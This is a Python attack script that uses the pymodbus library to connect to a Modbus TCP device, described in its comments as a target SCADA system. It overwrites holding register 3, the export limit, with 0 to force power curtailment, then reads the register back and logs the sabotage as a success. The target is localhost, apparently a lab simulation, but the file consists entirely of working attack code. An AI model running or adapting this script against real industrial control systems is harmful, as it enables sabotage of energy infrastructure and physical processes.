import asyncio
import logging

from pymodbus.client import AsyncModbusTcpClient

# Configuration
TARGET_IP = "localhost"
TARGET_PORT = 5020

logging.basicConfig(level=logging.INFO, format="%(asctime)s - [ATTACK] - %(message)s")


async def run_attack():
    client = AsyncModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    await client.connect()

    if not client.connected:
        logging.error("Could not connect to target!")
        return

    logging.info("Connected to target SCADA system.")

    # Attack: Set Export Limit to 0 to force curtailment
    logging.info(
        "Executing: Write Single Register (Func 0x06) - Target Reg: 3 (Export Limit)"
    )
    logging.info("Payload: Value = 0")

    # Register 3 is Export Limit
    await client.write_register(3, 0, slave=1)

    logging.info("Attack payload sent. Verifying impact...")

    # Read back to confirm
    rr = await client.read_holding_registers(3, 1, slave=1)
    if not rr.isError():
        val = rr.registers[0]
        logging.info(f"Target Register 3 Value is now: {val}")
        if val == 0:
            logging.info("SUCCESS: Export limit successfully sabotaged to 0kW.")
        else:
            logging.warning("FAILED: Value did not change.")

    client.close()


if __name__ == "__main__":
    asyncio.run(run_attack())
